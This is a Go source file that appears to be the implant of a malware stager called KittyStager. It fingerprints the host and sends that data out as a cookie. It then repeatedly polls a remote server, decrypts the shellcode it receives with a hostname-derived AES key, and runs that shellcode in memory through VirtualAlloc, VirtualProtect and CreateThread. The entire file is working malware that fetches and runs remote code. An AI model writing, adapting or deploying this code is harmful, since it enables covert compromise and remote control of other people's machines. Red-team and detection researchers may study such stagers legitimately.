package main

import (
	"KittyStager/cmd/cryptoUtil"
	"KittyStager/cmd/malwareUtil"
	"KittyStager/cmd/util"
	_ "embed"
	b64 "encoding/base64"
	"encoding/hex"
	"fmt"
	"golang.org/x/sys/windows"
	"strconv"
	"strings"
)

//go:embed conf.txt
var t string

var (
	sleepTime  int
	body       []byte
	initChecks util.InitialChecks
)

func main() {
	//get the shellcode by http
	conf := strings.Split(t, ",")
	sleepTime, _ = strconv.Atoi(conf[2])
	//initial recon
	host := malwareUtil.Recon()
	initChecks, _ = util.UnmarshalJSON(host)
	cookie := b64.StdEncoding.EncodeToString(host)
	cookieName := initChecks.GetKittenName()
	//initial request
	var err error
	// try to connect to the server
	for {
		body, err = malwareUtil.Request(cookie, conf)
		if err != nil {
			malwareUtil.Sleep(sleepTime)
		} else {
			break
		}
	}
	// if the response is not a shellcode, sleep and try again
	for {
		if len(body) > 10 {
			break
		}
		t, _ := strconv.Atoi(string(body))
		malwareUtil.Sleep(t)
		body, err = malwareUtil.Request(cookieName, conf)
		if err != nil || len(body) == 0 {
			malwareUtil.Sleep(sleepTime)
		}
		fmt.Println(body)
	}
	key := cryptoUtil.GenerateKey(initChecks.GetHostname(), 32)
	hexSc, _ := cryptoUtil.DecodeAES(body, []byte(key))
	shellcode, _ := hex.DecodeString(string(hexSc))
	//inject the shellcode
	inject(shellcode)
}

func inject(shellcode []byte) {

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	createThread := kernel32.NewProc("CreateThread")

	shellcodeExec, _ := windows.VirtualAlloc(
		uintptr(0),
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE)

	malwareUtil.Memcpy(shellcodeExec, shellcode)

	var oldProtect uint32
	windows.VirtualProtect(
		shellcodeExec,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		&oldProtect)

	hThread, _, _ := createThread.Call(
		0,
		0,
		shellcodeExec,
		uintptr(0),
		0,
		0)

	windows.WaitForSingleObject(
		windows.Handle(hThread),
		windows.INFINITE)
}
